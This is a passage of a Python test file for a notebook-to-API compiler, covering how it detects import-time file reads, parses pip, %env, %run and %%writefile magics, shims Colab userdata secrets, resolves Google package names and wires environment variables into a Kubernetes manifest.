    assert env_example_content(env_vars) == env_example_content(env_vars, None)
    assert "Read by the notebook" not in env_example_content(env_vars)


def test_import_time_hazards_cover_more_readers_and_path_read_text(tmp_path):
    from backend.compiler import _find_import_time_hazards, find_data_files

    cells = [
        "import pandas as pd, pathlib\n"
        "from pathlib import Path\n"
        "a = pd.read_xml('feed.xml')\n"
        "b = pd.read_orc('t.orc')\n"
        "c = Path('notes.txt').read_text()\n"
        "d = pathlib.Path('blob.bin').read_bytes()\n"
        "e = keras.models.load_model('model.h5')\n"
        "f = text_obj.read_text('utf-8')\n"
        "g = Path(some_var).read_text()\n"
        "h = Path('x.txt').read_text(encoding='utf-8')\n"
    ]

    hazards = _find_import_time_hazards(cells)

    assert [(h["call"], h["path"]) for h in hazards] == [
        ("pd.read_xml", "feed.xml"),
        ("pd.read_orc", "t.orc"),
        ("read_text", "notes.txt"),
        ("read_bytes", "blob.bin"),
        ("load_model", "model.h5"),
        ("read_text", "x.txt"),
    ]

    for name in ("feed.xml", "notes.txt", "model.h5"):
        (tmp_path / name).write_text("x")
    shipped = find_data_files(tmp_path / "nb.ipynb", cells)
    assert sorted(shipped) == ["feed.xml", "model.h5", "notes.txt"]


def test_kubernetes_manifest_reads_notebook_env_vars_from_the_secret():
    yaml = pytest.importorskip("yaml")
    from backend.generator.kubernetes_generator import kubernetes_manifest_content

    manifest = kubernetes_manifest_content(
        "pkg", [], None,
        notebook_env_vars=[
            {"name": "OPENAI_API_KEY", "required": True},
            {"name": "REGION", "required": False},
        ],
    )

    deployment = next(d for d in yaml.safe_load_all(manifest) if d["kind"] == "Deployment")
    env = {e["name"]: e for e in deployment["spec"]["template"]["spec"]["containers"][0]["env"]}
    required = env["OPENAI_API_KEY"]["valueFrom"]["secretKeyRef"]
    optional = env["REGION"]["valueFrom"]["secretKeyRef"]
    assert required == {"name": "pkg-secrets", "key": "OPENAI_API_KEY"}
    assert optional == {"name": "pkg-secrets", "key": "REGION", "optional": True}
    assert "--from-literal=OPENAI_API_KEY=<value>" in manifest
    assert "Optional keys the notebook reads" in manifest and "REGION" in manifest.split("apiVersion")[0]


def test_kubernetes_manifest_is_unchanged_without_notebook_env_vars():
    from backend.generator.kubernetes_generator import kubernetes_manifest_content

    assert kubernetes_manifest_content("pkg", []) == kubernetes_manifest_content("pkg", [], None, [])


def test_compile_and_read_notebook_env_vars_feed_the_kubernetes_manifest(tmp_path):
    yaml = pytest.importorskip("yaml")
    from backend.compiler import compile_notebook, read_notebook_env_vars

    notebook = tmp_path / "nb.ipynb"
    _write_notebook_importing(
        notebook,
        "import os\nKEY = os.environ['DB_URL']\n\ndef run(a: int) -> int:\n    return a\n",
    )
    out = tmp_path / "out"

    compile_notebook(str(notebook), str(out))

    assert read_notebook_env_vars(out) == [{"name": "DB_URL", "required": True}]
    assert read_notebook_env_vars(tmp_path / "missing") == []
    deployment = next(
        d for d in yaml.safe_load_all((out / "kubernetes.yaml").read_text()) if d["kind"] == "Deployment"
    )
    names = [e["name"] for e in deployment["spec"]["template"]["spec"]["containers"][0]["env"]]
    assert "DB_URL" in names


def test_pip_install_specs_reads_pip_magic_and_shell_lines():
    from backend.compiler import _pip_install_specs
    from backend.parser.notebook_parser import strip_magic_commands

    raw = (
        "%pip install -q \"pandas>=1.0\" seaborn\n"
        "!pip install --upgrade numpy==1.26.0 -r requirements.txt --index-url https://x/simple scipy\n"
        "!python -m pip install seaborn==0.13.0 ./local_pkg git+https://github.com/o/r.git\n"
        "! pip3 install Pillow  # imaging\n"
        "!pip install seaborn\n"
        "!pip uninstall -y torch\n"
        "!pip list\n"
        "x = 1\n"
    )

    specs = _pip_install_specs([strip_magic_commands(raw)])

    assert specs == ["pandas>=1.0", "seaborn==0.13.0", "numpy==1.26.0", "scipy", "Pillow"]


def test_pip_install_specs_ignores_lines_inside_strings():
    from backend.compiler import _pip_install_specs

    cell = 'DOC = """\n# !pip install not-a-real-dep\n"""\n# !pip install real-dep\n'

    assert _pip_install_specs([cell]) == ["real-dep"]


def test_explicit_requirements_include_pip_installs_but_directives_win_and_never_conflict():
    from backend.compiler import _extract_explicit_requirements

    cells = [
        "# notebook-to-api: requires pandas==2.0.0\n# !pip install pandas==1.5.0 tqdm\n",
        "# !pip install numpy==1.24.0\n# !pip install numpy==1.26.0\n",
    ]

    assert _extract_explicit_requirements(cells) == ["pandas==2.0.0", "tqdm", "numpy==1.24.0"]


def test_compile_pins_packages_named_only_in_pip_install_cells(tmp_path):
    from backend.compiler import compile_notebook

    notebook = tmp_path / "nb.ipynb"
    _write_notebook_importing(
        notebook,
        "%pip install -q python-slugify tqdm\n\ndef run(a: int) -> int:\n    return a\n",
    )
    out = tmp_path / "out"

    compile_notebook(str(notebook), str(out))

    requirements = (out / "requirements.txt").read_text().splitlines()
    assert "python-slugify" in requirements and "tqdm" in requirements


def test_writefile_modules_recovers_module_sources_from_commented_cells():
    from backend.compiler import _writefile_modules
    from backend.parser.notebook_parser import strip_magic_commands

    cells = [
        strip_magic_commands("%%writefile helpers.py\ndef twice(x):\n\n    return x * 2\n"),
        strip_magic_commands("%%writefile -a helpers.py\nTHREE = 3\n"),
        strip_magic_commands("%%writefile sub/other.py\nX = 1\n"),
        strip_magic_commands("%%writefile data.csv\na,b\n"),
        strip_magic_commands("%%writefile replaced.py\nA = 1\n"),
        strip_magic_commands("%%writefile replaced.py\nA = 2\n"),
        "x = 1\n",
    ]

    modules = _writefile_modules(cells)

    assert sorted(modules) == ["helpers", "replaced"]
    assert modules["helpers"] == "def twice(x):\n\n    return x * 2\nTHREE = 3\n"
    assert modules["replaced"] == "A = 2\n"
    compile(modules["helpers"], "helpers.py", "exec")


def test_compile_ships_writefile_modules_and_their_dependencies(tmp_path):
    import nbformat
    from backend.compiler import compile_notebook

    notebook = nbformat.v4.new_notebook()
    notebook.cells = [
        nbformat.v4.new_code_cell(
            "%%writefile mathlib.py\nimport yaml\n\ndef twice(x):\n    return x * 2\n"
        ),
        nbformat.v4.new_code_cell(
            "import mathlib\n\ndef run(a: int) -> int:\n    return mathlib.twice(a)\n"
        ),
    ]
    path = tmp_path / "nb.ipynb"
    with open(path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)
    out = tmp_path / "out"

    compile_notebook(str(path), str(out))

    assert (out / "runtime" / "mathlib.py").read_text().startswith("import yaml")
    requirements = (out / "requirements.txt").read_text().splitlines()
    assert "mathlib" not in requirements
    assert any(line.startswith("PyYAML") for line in requirements)
    assert "_nb_sys.path.insert" in (out / "runtime" / "notebook_module.py").read_text()


def test_writefile_module_wins_over_a_stale_file_on_disk(tmp_path):
    from backend.compiler import find_local_modules

    (tmp_path / "helpers.py").write_text("OLD = 1\n")

    found = find_local_modules(
        tmp_path / "nb.ipynb", {"helpers"}, ["# %%writefile helpers.py\n# NEW = 2\n"]
    )

    assert found == {"helpers": "NEW = 2\n"}


def test_google_namespace_imports_resolve_to_their_real_distributions():
    from backend.parser.ast_parser import extract_imports_from_code, google_distribution_for_module

    code = (
        "import google.generativeai as genai\n"
        "from google.cloud import storage\n"
        "from google.cloud.bigquery_storage import BigQueryReadClient\n"
        "from google.protobuf import json_format\n"
        "from google.oauth2 import service_account\n"
        "from google import genai as newgenai\n"
        "from google.colab import drive, userdata\n"
        "import google\n"
        "import numpy\n"
    )

    imports = extract_imports_from_code(code)
    assert "google" not in imports
    assert {"google-generativeai", "protobuf", "google-auth", "google-genai", "numpy"} <= imports
    assert "google-cloud-bigquery-storage" in imports
    assert not any("colab" in name for name in imports)
    assert google_distribution_for_module("google.adk.agents") == "google-adk"
    assert google_distribution_for_module("google.cloud") is None
    assert google_distribution_for_module("google") is None


def test_compile_pins_the_real_google_distribution(tmp_path):
    from backend.compiler import compile_notebook

    notebook = tmp_path / "nb.ipynb"
    _write_notebook_importing(
        notebook,
        "import google.generativeai as genai\nfrom google.colab import userdata\n\n"
        "def run(a: int) -> int:\n    return a\n",
    )
    out = tmp_path / "out"

    compile_notebook(str(notebook), str(out))

    names = [line.split("==")[0] for line in (out / "requirements.txt").read_text().splitlines()]
    assert "google-generativeai" in names
    assert "google" not in names


def test_import_time_hazards_flag_google_colab_imports():
    from backend.compiler import _find_import_time_hazards
    from backend.inspector import startup_warning_lines

    cells = [
        "import os\nfrom google.colab import drive, userdata\n",
        "import google.colab.files\nfrom google import colab\n"
        "from google.cloud import storage\nimport google.generativeai\n",
        "def f():\n    from google.colab import auth\n",
        "if __name__ == '__main__':\n    from google.colab import files\n",
    ]

    hazards = _find_import_time_hazards(cells)

    assert [(h["kind"], h["call"], h["cell"], h["line"]) for h in hazards] == [
        ("colab_import", "import google.colab", 1, 2),
        ("colab_import", "import google.colab.files", 2, 1),
        ("colab_import", "import google.colab", 2, 2),
    ]
    lines = startup_warning_lines({"import_time_hazards": hazards})
    assert "only exists inside Google Colab" in lines[0]
    assert "Cell 1, line 2" in lines[0]


def test_env_magic_values_reads_assignments_and_ignores_queries_and_strings():
    from backend.compiler import _env_magic_values
    from backend.parser.notebook_parser import strip_magic_commands

    raw = (
        "%env REGION=eu-west-1\n"
        "%env TOKEN abc def\n"
        "%env QUERY_ONLY\n"
        "%set_env LEVEL=debug\n"
        "%env REGION=us-east-1\n"
        'DOC = """\n%env IN_STRING=1\n"""\n'
    )

    assert _env_magic_values([strip_magic_commands(raw)]) == {
        "REGION": "us-east-1", "TOKEN": "abc def", "LEVEL": "debug",
    }


def test_compile_applies_env_magics_with_setdefault_and_they_satisfy_required_reads(
    tmp_path, monkeypatch
):
    from backend.compiler import compile_notebook, read_notebook_env_vars

    notebook = tmp_path / "nb.ipynb"
    _write_notebook_importing(
        notebook,
        "%env MODEL_NAME=small\nimport os\nNAME = os.environ['MODEL_NAME']\n"
        "OTHER = os.environ['STILL_REQUIRED']\n\ndef run(a: int) -> str:\n    return NAME\n",
    )
    out = tmp_path / "out"

    compile_notebook(str(notebook), str(out))

    source = (out / "runtime" / "notebook_module.py").read_text()
    monkeypatch.setenv("MODEL_NAME", "placeholder")
    monkeypatch.delenv("MODEL_NAME")  # restored to unset at teardown
    monkeypatch.setenv("STILL_REQUIRED", "x")
    namespace = {}
    exec(source, namespace)
    assert namespace["NAME"] == "small"

    monkeypatch.setenv("MODEL_NAME", "from-deployment")
    namespace = {}
    exec(source, namespace)
    assert namespace["NAME"] == "from-deployment"

    assert read_notebook_env_vars(out) == [
        {"name": "MODEL_NAME", "required": False},
        {"name": "STILL_REQUIRED", "required": True},
    ]


def test_colab_userdata_imports_are_supported_other_colab_imports_still_hazards():
    from backend.compiler import _find_import_time_hazards

    supported = ["from google.colab import userdata\nimport google.colab.userdata\n"
                 "from google.colab.userdata import get\n"]
    mixed = ["from google.colab import drive, userdata\n"]
    other = ["from google.colab import files\n"]

    assert _find_import_time_hazards(supported) == []
    assert [h["call"] for h in _find_import_time_hazards(mixed)] == ["import google.colab"]
    assert len(_find_import_time_hazards(other)) == 1


def test_colab_userdata_shim_reads_secrets_from_the_environment(monkeypatch):
    import sys
    from backend.compiler import _COLAB_USERDATA_SHIM, _uses_colab_userdata

    assert _uses_colab_userdata(["from google.colab import userdata\n"])
    assert not _uses_colab_userdata(["from google.colab import drive\n", "x = 1\n"])

    saved = {k: sys.modules.get(k) for k in ("google", "google.colab", "google.colab.userdata")}
    for key in saved:
        sys.modules.pop(key, None)
    try:
        monkeypatch.setenv("COLAB_TEST_SECRET", "s3cret")
        monkeypatch.delenv("COLAB_TEST_MISSING", raising=False)
        namespace = {}
        exec(_COLAB_USERDATA_SHIM + "from google.colab import userdata\n", namespace)
        userdata = namespace["userdata"]

        assert userdata.get("COLAB_TEST_SECRET") == "s3cret"
        with pytest.raises(userdata.SecretNotFoundError, match="COLAB_TEST_MISSING"):
            userdata.get("COLAB_TEST_MISSING")
    finally:
        for key, module in saved.items():
            sys.modules.pop(key, None)
            if module is not None:
                sys.modules[key] = module


def test_compile_with_colab_userdata_starts_and_lists_its_secrets_as_env_vars(
    tmp_path, monkeypatch
):
    import sys
    from backend.compiler import compile_notebook, read_notebook_env_vars

    notebook = tmp_path / "nb.ipynb"
    _write_notebook_importing(
        notebook,
        "from google.colab import userdata\nKEY = userdata.get('COLAB_E2E_KEY')\n\n"
        "def run(a: int) -> str:\n    return KEY\n",
    )
    out = tmp_path / "out"
    compile_notebook(str(notebook), str(out))

    assert read_notebook_env_vars(out) == [{"name": "COLAB_E2E_KEY", "required": True}]

    saved = {k: sys.modules.get(k) for k in ("google", "google.colab", "google.colab.userdata")}
    for key in saved:
        sys.modules.pop(key, None)
    try:
        monkeypatch.setenv("COLAB_E2E_KEY", "abc")
        namespace = {}
        exec((out / "runtime" / "notebook_module.py").read_text(), namespace)
        assert namespace["run"](1) == "abc"
    finally:
        for key, module in saved.items():
            sys.modules.pop(key, None)
            if module is not None:
                sys.modules[key] = module


def test_run_magic_scripts_lists_relative_py_targets_only():
    from backend.compiler import _run_magic_scripts
    from backend.parser.notebook_parser import strip_magic_commands

    raw = (
        "%run helper.py\n%run -i ./sub/tool.py arg1 arg2\n%run other.ipynb\n"
        "%run /abs/x.py\n%run ../up.py\n%run helper.py\n"
        'DOC = """\n%run in_string.py\n"""\n'
    )

    assert _run_magic_scripts([strip_magic_commands(raw)]) == ["helper.py", "sub/tool.py"]


def test_compile_ships_run_scripts_and_executes_them_in_the_notebook_namespace(tmp_path):
    from backend.compiler import compile_notebook

    (tmp_path / "defs.py").write_text("BASE = LIMIT * 2\n\ndef scale(x):\n    return x * BASE\n")
    notebook = tmp_path / "nb.ipynb"
    _write_notebook_importing(
        notebook,
        "LIMIT = 5\n%run defs.py\n\ndef run(a: int) -> int:\n    return scale(a)\n",
    )
    out = tmp_path / "out"

    compile_notebook(str(notebook), str(out))

    assert (out / "runtime" / "defs.py").exists()
    source = (out / "runtime" / "notebook_module.py").read_text()
    assert "_nb_run_script('defs.py')" in source
    namespace = {"__file__": str(out / "runtime" / "notebook_module.py")}
    exec(source, namespace)
    assert namespace["run"](3) == 30
    assert "__builtins__" in namespace and namespace["BASE"] == 10


def test_run_magic_without_a_shipped_script_stays_a_comment(tmp_path):
    from backend.compiler import compile_notebook

    notebook = tmp_path / "nb.ipynb"
    _write_notebook_importing(
        notebook, "%run missing.py\n\ndef run(a: int) -> int:\n    return a\n"
    )
    out = tmp_path / "out"

    compile_notebook(str(notebook), str(out))

    source = (out / "runtime" / "notebook_module.py").read_text()
    assert "_nb_run_script(" not in source
    assert "# %run missing.py" in source
